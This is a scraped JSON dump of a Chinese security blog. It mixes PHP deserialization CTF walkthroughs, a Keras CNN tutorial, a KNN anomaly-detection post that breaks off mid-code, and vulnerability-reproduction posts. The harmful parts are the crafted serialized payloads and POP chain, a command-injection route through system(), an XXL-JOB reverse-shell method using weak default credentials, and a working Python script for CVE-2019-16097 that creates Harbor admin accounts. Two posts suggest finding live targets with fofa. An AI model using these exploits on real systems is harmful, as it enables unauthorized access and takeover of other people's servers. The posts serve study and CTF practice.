例如想让getInfo输出一些其他的东西。 12345678910111213&lt;?php class come&#123; public $name=&quot;Rainbow&quot;; public $pass=&quot;123456&quot;; public function getInfo()&#123; echo &#x27;Username: &#x27; . $this-&gt;name . &quot; Password: &quot; . $this-&gt;pass; &#125; &#125; $come1 = new come(); echo $come1-&gt;getInfo().&#x27;&lt;br /&gt;&#x27;; unserialize($_GET[&#x27;come&#x27;])-&gt;getInfo(); echo $come1-&gt;getInfo().&#x27;&lt;br /&gt;&#x27;;?&gt; 可以看到，Username和Password的值已经变了，其实就是新建了一个对象，然后调用come对象里面的getInfo函数输出 。 上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片： 显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下： protected使用的前缀为%00*%00 对成员变量进行修饰。 PHP类的魔术方法魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个 __construct 当一个对象创建时被调用 __destruct 当一个对象销毁时被调用 __toString 当一个对象被当作一个字符串使用 __sleep 在对象被序列化之前运行 __wakeup 在对象被反序列化之后被调用 __call():当要调用的方法不存在或权限不足时自动调用 __invoke():当把一个类当作函数使用时自动调用 拿网上最好的例子： 12345678910111213141516171819202122232425262728293031323334&lt;?php class Test&#123; public function __construct()&#123; echo &#x27;construct run&#x27;; &#125; public function __destruct()&#123; echo &#x27;destruct run&#x27;; &#125; public function __toString()&#123; echo &#x27;toString run&#x27;; return &#x27;qwe&#x27;; &#125; public function __sleep()&#123; echo &#x27;sleep run&#x27;; &#125; public function __wakeup()&#123; echo &#x27;wakeup run&#x27;; &#125;&#125; $test= new Test(); // 创建对象的时候运行 construct echo &#x27;&lt;br /&gt;&#x27;; $sTest= serialize($test); // 序列化的时候先调用 sleep echo &#x27;&lt;br /&gt;&#x27;; $usTest= unserialize($sTest); // 反序列先调用__wakeup函数 echo &#x27;&lt;br /&gt;&#x27;; $string= &#x27;hello class &#x27; . $test; // 调用toString函数 echo &#x27;&lt;br /&gt;&#x27;; //整个结束调用destruct函数?&gt; 案例关卡一12345678910&lt;?php error_reporting(0); $KEY = &quot;D0g3!!!&quot;; $str = $_GET[&#x27;str&#x27;]; if (unserialize($str) === &quot;$KEY&quot;) &#123; echo &quot;success&quot;; &#125; show_source(__FILE__);?&gt; 可以看到如果反序列化$_GET&#123;&#39;str&#39;]之后的内容为D0g3!!!，那么就能成功。那就简单了，逆向考虑，$str=serialize($KEY)即可 关卡二123456789101112131415161718192021222324252627&lt;?php class SoFun&#123; protected $file=&#x27;index.php&#x27;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, &#x27;/&#x27;)===false) show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file); else die(&#x27;Wrong filename.&#x27;); &#125; &#125; function __wakeup()&#123; $this-&gt; file=&#x27;index.php&#x27;; &#125; public function __toString()&#123; return &#x27;&#x27; ; &#125; &#125; if (!isset($_GET[&#x27;file&#x27;]))&#123; show_source(&#x27;index.php&#x27;); &#125; else&#123; $file=base64_decode( $_GET[&#x27;file&#x27;]); echo unserialize($file ); &#125; ?&gt; &lt;!--key in flag.php--&gt; 这里通过$_GET[&#39;file&#39;]获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用wakeup函数，在这里，会直接把文件名直接给替换成index.php，然后才会show源码。既然不能改变$file的值，那么只有绕过这个函数了。 构造payload如下： 12345O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 这是正常构造的payload，但是这个payload会经过wakeup函数但是要想绕过wakeup，需要修改到下面这种形式O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过 绕过具体可以参考https://www.cnblogs.com/zy-king-karl/p/11436872.html 关卡三来源：https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4 一串连环套的调用案例，源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass start_gg&#123; public $mod1; public $mod2; public function __destruct()&#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; public function test1()&#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; public function __call($test2,$arr)&#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; public function __invoke()&#123; $this-&gt;mod2 = &quot;`字符串拼接`&quot;.$this-&gt;mod1; &#125;&#125;class string1&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag()&#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;$a = $_GET[&#x27;string&#x27;];unserialize($a);?&gt; 那只有倒退了。要想获取flag，就要调用get_flag函数，要想调用get_flag函数，就需要掉i用__toString方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是func类里面的invoke函数，而invoke函数只有把类当作函数使用的时候才会被调用，然后又看到funct对象，而call只有调用方法不存在的情况下被调用，再看到Call，里面调用了一个不知道的函数，然后就追溯到destruct函数。构造payload： 在每个函数里面添加一个 construct初始化函数，并指向下一个函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpclass start_gg&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new Call(); &#125; public function __destruct()&#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new funct(); &#125; public function test1()&#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new func(); &#125; public function __call($test2,$arr)&#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; function __construct()&#123; $this-&gt;mod1 = new string1(); &#125; public function __invoke()&#123; $this-&gt;mod2 = &quot;`字符串拼接`&quot;.$this-&gt;mod1; &#125;&#125;class string1&#123; public $str1; public $str2; function __construct()&#123; $this-&gt;str1 = new GetFlag(); &#125; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag()&#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;echo serialize(new start_gg());?&gt; 生成的payload如下 1O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;","categories":[],"tags":[{"name":"php反序列化","slug":"php反序列化","permalink":"http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"PHP反序列化案例","slug":"PHP反序列化","date":"2020-11-09T00:36:36.000Z","updated":"2020-11-09T01:09:55.139Z","comments":true,"path":"2020/11/09/PHP反序列化/","link":"","permalink":"http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"PHP反序列化漏洞案例在看php反序列化的时候遇到下面这个题，来自于：https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。","text":"PHP反序列化漏洞案例在看php反序列化的时候遇到下面这个题，来自于：https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。 源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str; &#125; function echos($host)&#123; system(&quot;echo $host&quot;.$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first=&#x27;hi&#x27;;$var=&#x27;var&#x27;;$bbb=&#x27;bbb&#x27;;$ccc=&#x27;ccc&#x27;;$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===&quot;doller&quot;)&#123; @parse_str($_GET[&#x27;a&#x27;]); if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&#x27;come&#x27;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125;&#125;else&#123; echo &quot;Can you hack me?&lt;br&gt;&quot;;&#125;?&gt; 上面代码可以分为两个阶段来看，第一个阶段就是如何进入到下面的反序列化代码中，第二个如何利用反序列化进行代码执行。 第一阶段代码片段如下。 1234567891011121314151617181920212223242526272829303132$first=&#x27;hi&#x27;;$var=&#x27;var&#x27;;$bbb=&#x27;bbb&#x27;;$ccc=&#x27;ccc&#x27;;$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1)&#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===&quot;doller&quot;)&#123; @parse_str($_GET[&#x27;a&#x27;]); if($var===&quot;give&quot;)&#123; if($bbb===&quot;me&quot;)&#123; if($ccc===&quot;flag&quot;)&#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&#x27;come&#x27;]; unserialize($come); &#125; &#125; else&#123; echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else&#123; echo &quot;NO&quot;; &#125;&#125;else&#123; echo &quot;Can you hack me?&lt;br&gt;&quot;;&#125; 看到有两个$$直接反手一个变量覆盖，直接访问：http://127.0.0.1/test.php?first=doller&amp;var=give&amp;bbb=me&amp;ccc=flag。 这怎么是个NO，仔细一看才知道这个变量覆盖只能利用一次，i++之后就进不去了。那只能往下看，注意到有个parse_str的函数。这个函数的作用如下，将键值对中的键直接变成了变量。 这会儿就要怎么考虑利用这个a了。浏览器在发起URL时，猜测本地应该会先分割，先用&amp;作为分割符，然后传输。 对&amp;进行url编码后，后面所有的东西都会被浏览器当成a的值，这个时候才发送出去。 第二阶段反序列化漏洞，变量覆盖之类的可以忽略了。简化代码如下： 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*|;?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str; &#125; function echos($host)&#123; system(&quot;echo $host&quot;.$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$come=@$_POST[&#x27;come&#x27;];unserialize($come);?&gt; 假设此时外部传入序列化后的字符串，函数调用顺序为：wakeup --&gt; waf --&gt; destruct --&gt; echos。然后随便写一个payload测试下： 拿着这一串payload直接上，输出见下图。 然后就是过滤。直接看freebuf那片文章就行。在作者这篇文章中，给args传参为&amp;type.\\flaflagg.txt，但是我测试了好久，始终没读到数据，然后调试发现那个&amp;有问题，发过去了服务端接收不了，所以一直报错。 然后使用url编码后，就直接能绕过去了。","categories":[],"tags":[{"name":"php反序列化","slug":"php反序列化","permalink":"http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CNN卷积神经网络","slug":"CNN卷积神经网络","date":"2020-07-15T06:26:15.000Z","updated":"2021-02-04T05:13:51.828Z","comments":true,"path":"2020/07/15/CNN卷积神经网络/","link":"","permalink":"http://example.com/2020/07/15/CNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","excerpt":"CNN卷积神经网络图片组成这里引用别人博客内容解释 一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。","text":"CNN卷积神经网络图片组成这里引用别人博客内容解释 一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。 例如上图片尺寸是$500 \\cdot 338$ 的，表示图片是由一个$500 \\cdot 338$的像素点矩阵构成的，共有$500 \\cdot 338 = 149000$个像素点。 一个像素点的颜色是由RGB三个值来表现的，所以像素点矩阵对应三个颜色向量矩阵，分别是R矩阵($500 \\cdot 338$)，G矩阵($500 \\cdot 338$)，B矩阵($500 \\cdot 338$)。如果每个矩阵的第一行第一列的值分别为：$R：240，G：223，B：204，$所以这个像素点的颜色就是$（240,223,204）$ 灰度是表明图像明暗的数值，即黑白图像中点的颜色深度，范围一般从0到255，白色为255 ，黑色为0，故黑白图片也称灰度图像。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。 灰度就是没有色彩，RGB色彩分量全部相等。图像的灰度化就是让像素点矩阵中的每一个像素点都满足关系：R=G=B，此时的这个值叫做灰度值。如RGB(100,100,100)就代表灰度值为100,RGB(50,50,50)代表灰度值为50。 一个简单的CNN卷积神经网络卷积神经网络处理图片的过程如下图 ·基于MNIST数据集的卷积神经网络 导入需要的包 12345678from keras.layers import Dense, Conv2D, Flatten, MaxPooling2D, Dropoutfrom keras.datasets import mnistfrom keras.utils import to_categoricalfrom keras import Sequentialfrom keras import backend as Kimport numpy as npimport kerasimport os Using TensorFlow backend. 使用 GPU 加速(可选) 1os.environ[&quot;CUDA_VISIBLE_DEVICES&quot;] = &quot;0&quot; 定义一些全局变量 1234567# 设置全局变量num_classes = 10 # 类别batch_size = 128 # 批次大小epochs = 12 # 训练多少次# 设置图片维度img_rows, img_cols = 28, 28 # 图片的大小 加载数据并处理数据 123456789101112131415161718192021# 加载 MNIST 数据集(x_train, y_train), (x_test, y_test) = mnist.load_data()# 处理数据集：针对训练集归一化，针对测试集one-hot编码# 判断深度学习框架需要输入的维度if K.image_data_format() == &quot;channels_first&quot;: x_train = x_train.reshape(x_train.shape[0], 1, img_rows, img_cols) x_test = x_test.reshape(x_test.shape[0], 1, img_rows, img_cols) input_shape = (1, img_rows, img_cols)else: x_train = x_train.reshape(x_train.shape[0], img_rows, img_cols, 1) x_test = x_test.reshape(x_test.shape[0], img_rows, img_cols, 1) input_shape = (img_rows, img_cols, 1)# 1. 归一化 x_train = x_train.astype(np.float32) / 255x_test = x_test.astype(np.float32) / 255# 2. one-hot 编码y_train = to_categorical(y_train, num_classes)y_test = to_categorical(y_test, num_classes) 构建卷积神经网络 12345678910# 构建卷积神经网络模型model = Sequential()model.add(Conv2D(32, kernel_size=(3, 3), activation=&#x27;relu&#x27;, input_shape=input_shape)) # 32个过滤器，过滤器大小是3×3，32×26×26model.add(Conv2D(64, (3, 3), activation=&#x27;relu&#x27;)) #64×24×24model.add(MaxPooling2D(pool_size=(2, 2)))# 向下取样model.add(Dropout(0.25))model.add(Flatten()) #降维：将64×12×12降为1维（即把他们相乘起来）model.add(Dense(128, activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(num_classes, activation=&#x27;softmax&#x27;)) #全连接2层 编译模型 12# 编译模型model.compile(loss=keras.losses.categorical_crossentropy, optimizer=keras.optimizers.Adadelta(), metrics=[&#x27;accuracy&#x27;]) 训练神经网络 12# 神经网络history = model.fit(x_train, y_train, batch_size=32, epochs=epochs, verbose=1, validation_data=(x_test, y_test)) Train on 60000 samples, validate on 10000 samples Epoch 1/12 60000/60000 [==============================] - 23s 378us/step - loss: 0.1819 - acc: 0.9451 - val_loss: 0.0455 - val_acc: 0.9854 Epoch 2/12 60000/60000 [==============================] - 18s 295us/step - loss: 0.0755 - acc: 0.9777 - val_loss: 0.0393 - val_acc: 0.9879 Epoch 3/12 60000/60000 [==============================] - 18s 296us/step - loss: 0.0567 - acc: 0.9829 - val_loss: 0.0392 - val_acc: 0.9869 Epoch 4/12 60000/60000 [==============================] - 18s 296us/step - loss: 0.0521 - acc: 0.9848 - val_loss: 0.0370 - val_acc: 0.9883 Epoch 5/12 60000/60000 [==============================] - 18s 297us/step - loss: 0.0487 - acc: 0.9855 - val_loss: 0.0337 - val_acc: 0.9887 Epoch 6/12 60000/60000 [==============================] - 18s 296us/step - loss: 0.0466 - acc: 0.9862 - val_loss: 0.0314 - val_acc: 0.9894 Epoch 7/12 60000/60000 [==============================] - 18s 296us/step - loss: 0.0446 - acc: 0.9867 - val_loss: 0.0285 - val_acc: 0.9910 Epoch 8/12 60000/60000 [==============================] - 18s 297us/step - loss: 0.0426 - acc: 0.9871 - val_loss: 0.0295 - val_acc: 0.9909 Epoch 9/12 60000/60000 [==============================] - 18s 297us/step - loss: 0.0419 - acc: 0.9877 - val_loss: 0.0367 - val_acc: 0.9893 Epoch 10/12 60000/60000 [==============================] - 18s 297us/step - loss: 0.0406 - acc: 0.9882 - val_loss: 0.0318 - val_acc: 0.9905 Epoch 11/12 60000/60000 [==============================] - 18s 298us/step - loss: 0.0397 - acc: 0.9885 - val_loss: 0.0282 - val_acc: 0.9909 Epoch 12/12 60000/60000 [==============================] - 18s 297us/step - loss: 0.0369 - acc: 0.9894 - val_loss: 0.0395 - val_acc: 0.9888 作出训练期间 loss 和 accuracy 的图像 12345678import matplotlib.pyplot as pltplt.plot(history.history[&#x27;loss&#x27;])plt.plot(history.history[&#x27;acc&#x27;])plt.title(&#x27;model accuracy&#x27;)plt.xlabel(&#x27;epoch&#x27;)plt.ylabel(&#x27;accuracy&#x27;)plt.legend([&#x27;loss&#x27;, &#x27;accuracy&#x27;], loc=&#x27;lower right&#x27;)plt.show() 评价模型 1234# 评价模型score = model.evaluate(x_test, y_test, verbose=0)print(&quot;Test loss：&quot;, score[0])print(&quot;Test accuracy: &quot;, score[1]) Test loss： 0.03945192432178337 Test accuracy: 0.9888 LetNet5 模型123456789101112131415161718192021222324252627model = Sequential()# 第一个卷积层 28*28*1 --&gt; model.add(Conv2D(6, kernel_size=(5, 5), activation=&#x27;relu&#x27;, input_shape=(28, 28, 1)))# 池化层model.add(MaxPooling2D(pool_size=(2, 2)))# 第二个卷积层model.add(Conv2D(16, kernel_size=(5, 5), activation=&#x27;relu&#x27;))# 池化层model.add(MaxPooling2D(pool_size=(2, 2)))# 展平model.add(Flatten())# 全连接层model.add(Dense(120, activation=&#x27;relu&#x27;))# 全连接层model.add(Dense(84, activation=&#x27;relu&#x27;))# 全连接层model.add(Dense(10, activation=&#x27;softmax&#x27;))# 模型编译model.compile(loss=keras.metrics.categorical_crossentropy, optimizer=keras.optimizers.Adam(), metrics=[&#x27;accuracy&#x27;])model.summary() _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= conv2d_5 (Conv2D) (None, 24, 24, 6) 156 _________________________________________________________________ max_pooling2d_4 (MaxPooling2 (None, 12, 12, 6) 0 _________________________________________________________________ conv2d_6 (Conv2D) (None, 8, 8, 16) 2416 _________________________________________________________________ max_pooling2d_5 (MaxPooling2 (None, 4, 4, 16) 0 _________________________________________________________________ flatten_3 (Flatten) (None, 256) 0 _________________________________________________________________ dense_6 (Dense) (None, 120) 30840 _________________________________________________________________ dense_7 (Dense) (None, 84) 10164 _________________________________________________________________ dense_8 (Dense) (None, 10) 850 ================================================================= Total params: 44,426 Trainable params: 44,426 Non-trainable params: 0 _________________________________________________________________ AlexNet 模型模型架构如下：一共有5个卷积层（Conv2D），8个神经网络层（Conv2D + Dense） 123456789101112131415161718192021222324252627# 创建模型序列 model = Sequential()#第一层卷积网络，使用96个卷积核，大小为11x11步长为4， 要求输入的图片为227x227， 3个通道，不加边，激活函数使用relumodel.add(Conv2D(96, (11, 11), strides=(1, 1), input_shape=(28, 28, 1), padding=&#x27;same&#x27;, activation=&#x27;relu&#x27;, kernel_initializer=&#x27;uniform&#x27;))# 池化层model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2)))# 第二层加边使用256个5x5的卷积核，加边，激活函数为relumodel.add(Conv2D(256, (5, 5), strides=(1, 1), padding=&#x27;same&#x27;, activation=&#x27;relu&#x27;, kernel_initializer=&#x27;uniform&#x27;))#使用池化层，步长为2model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2)))# 第三层卷积，大小为3x3的卷积核使用384个model.add(Conv2D(384, (3, 3), strides=(1, 1), padding=&#x27;same&#x27;, activation=&#x27;relu&#x27;, kernel_initializer=&#x27;uniform&#x27;))# 第四层卷积,同第三层model.add(Conv2D(384, (3, 3), strides=(1, 1), padding=&#x27;same&#x27;, activation=&#x27;relu&#x27;, kernel_initializer=&#x27;uniform&#x27;))# 第五层卷积使用的卷积核为256个，其他同上model.add(Conv2D(256, (3, 3), strides=(1, 1), padding=&#x27;same&#x27;, activation=&#x27;relu&#x27;, kernel_initializer=&#x27;uniform&#x27;))model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2)))model.add(Flatten())model.add(Dense(4096, activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(4096, activation=&#x27;relu&#x27;))model.add(Dropout(0.5))model.add(Dense(10, activation=&#x27;softmax&#x27;))model.compile(loss=&#x27;categorical_crossentropy&#x27;, optimizer=&#x27;sgd&#x27;, metrics=[&#x27;accuracy&#x27;])model.summary() _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= conv2d_7 (Conv2D) (None, 28, 28, 96) 11712 _________________________________________________________________ max_pooling2d_6 (MaxPooling2 (None, 13, 13, 96) 0 _________________________________________________________________ conv2d_8 (Conv2D) (None, 13, 13, 256) 614656 _________________________________________________________________ max_pooling2d_7 (MaxPooling2 (None, 6, 6, 256) 0 _________________________________________________________________ conv2d_9 (Conv2D) (None, 6, 6, 384) 885120 _________________________________________________________________ conv2d_10 (Conv2D) (None, 6, 6, 384) 1327488 _________________________________________________________________ conv2d_11 (Conv2D) (None, 6, 6, 256) 884992 _________________________________________________________________ max_pooling2d_8 (MaxPooling2 (None, 2, 2, 256) 0 _________________________________________________________________ flatten_4 (Flatten) (None, 1024) 0 _________________________________________________________________ dense_9 (Dense) (None, 4096) 4198400 _________________________________________________________________ dropout_3 (Dropout) (None, 4096) 0 _________________________________________________________________ dense_10 (Dense) (None, 4096) 16781312 _________________________________________________________________ dropout_4 (Dropout) (None, 4096) 0 _________________________________________________________________ dense_11 (Dense) (None, 10) 40970 ================================================================= Total params: 24,744,650 Trainable params: 24,744,650 Non-trainable params: 0 _________________________________________________________________ 1","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"XXL-JOB反弹shell之打野","slug":"XXL-JOB反弹shell之打野","date":"2020-03-31T13:34:05.000Z","updated":"2021-02-04T05:09:31.514Z","comments":true,"path":"2020/03/31/XXL-JOB反弹shell之打野/","link":"","permalink":"http://example.com/2020/03/31/XXL-JOB%E5%8F%8D%E5%BC%B9shell%E4%B9%8B%E6%89%93%E9%87%8E/","excerpt":"XXL-JOB后台反弹shell之打野","text":"XXL-JOB后台反弹shell之打野 0x01 简介XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。 0x02 漏洞危害能够直接获取系统权限 0x03 漏洞产生原因主要是弱口令引起后台登陆，能够添加定时任务来进行反弹shell 0x04 漏洞挖掘使用 fofa搜索XXL-JOB 输入 admin/123456就能登录 添加定时任务 使用GLUE IDE编辑内容 监听端口，启动定时任务。得到反弹shell 0x05 修复建议密码搞复杂些，听到没有？","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Harbor任意管理员注册漏洞复现(CVE-2019-16097)","slug":"Harbor任意管理员注册漏洞复现-CVE-2019-16097","date":"2020-03-09T13:40:50.000Z","updated":"2020-03-10T01:23:17.192Z","comments":true,"path":"2020/03/09/Harbor任意管理员注册漏洞复现-CVE-2019-16097/","link":"","permalink":"http://example.com/2020/03/09/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-16097/","excerpt":"Harbor任意管理员注册漏洞复现(CVE-2019-16097)0x01 简介 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。","text":"Harbor任意管理员注册漏洞复现(CVE-2019-16097)0x01 简介 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。 0x02 漏洞简介注册模块校验不严格，造成垂直越权，使得任意用户均可注册管理员账号。 0x03 漏洞危害攻击者可以通过管理员账号管理Harbor镜像库，从而写入或替换成恶意的镜像，最终可以感染使用此仓库的客户端。 0x04 影响版本 1.7.0-1.8.2 0x05 漏洞复现使用 fofa 搜索关键词 1title&#x3D;&quot;Harbor&quot; &amp;&amp; country&#x3D;CN 找到注册页面 然后抓包 在末尾添加上如上图的内容 1&quot;has_admin_role&quot;:true 返回码如果是201，则表示注册成功，登录即可。 0x06 脚本12345678910111213141516import requestsdef cve2019_10697(url): base_url = url + &quot;/api/users&quot; payload = &#x27;&#123;&quot;username&quot;:&quot;unihac&quot;,&quot;email&quot;:&quot;unihac@gmail.com&quot;,&quot;realname&quot;:&quot;unihac&quot;,&quot;password&quot;:&quot;P@ssword&quot;,&quot;comment&quot;:&quot;0&quot;,&quot;has_admin_role&quot;:true&#125;&#x27; header = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;,&quot;Accept&quot;: &quot;application/json&quot;&#125; r = requests.post(base_url, data=payload, headers=header, timeout=10) if r.status_code == 201: print(&quot;--+ This URL is Vulnerable !&quot;) print(&quot;--+ Login username: unihac password: P@assword&quot;)if __name__ == &#x27;__main__&#x27;: print(&quot;Like: http://example.com:10000&quot;) url = input(&quot;URL: &quot;) cve2019_10697(url) 0x07 防御升级到最新版本。如1.7.6 以及 1.8.3","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Harbor","slug":"Harbor","permalink":"http://example.com/tags/Harbor/"}]},{"title":"sklearn之KNN近邻算法","slug":"sklearn之KNN近邻算法","date":"2020-01-07T06:02:51.000Z","updated":"2021-02-04T05:14:06.054Z","comments":true,"path":"2020/01/07/sklearn之KNN近邻算法/","link":"","permalink":"http://example.com/2020/01/07/sklearn%E4%B9%8BKNN%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/","excerpt":"sklearn之knn近邻算法近邻算法检测异常操作数据来源:http://www.schonlau.net/网页中的Masquerading User Data。其中包含50个用户的操作日志，每个日志包含1500条操作命令，前面5000条是正常的操作，后面的10000条日志中随即包含有异常操作。具体参考《Web安全机器学习入门》","text":"sklearn之knn近邻算法近邻算法检测异常操作数据来源:http://www.schonlau.net/网页中的Masquerading User Data。其中包含50个用户的操作日志，每个日志包含1500条操作命令，前面5000条是正常的操作，后面的10000条日志中随即包含有异常操作。具体参考《Web安全机器学习入门》 基础知识本来想自己写的，但是网上资料太多，就没必要写了。看下其他大佬写过的就行了： https://blog.csdn.net/zgcr654321/article/details/85219121 https://www.jianshu.com/p/3dcb39de04aa 这两个看了，基本上就没啥问题了 编程实现Step 1：随便选择一个user日志，里面每行代表一个命令。每150个命令弄成一个操作序列，保存在列表之中 1234567891011121314151617181920def load_user(filename): most_cmd = [] mini_cmd = [] cmd_list = [] cmd_seq = [] # 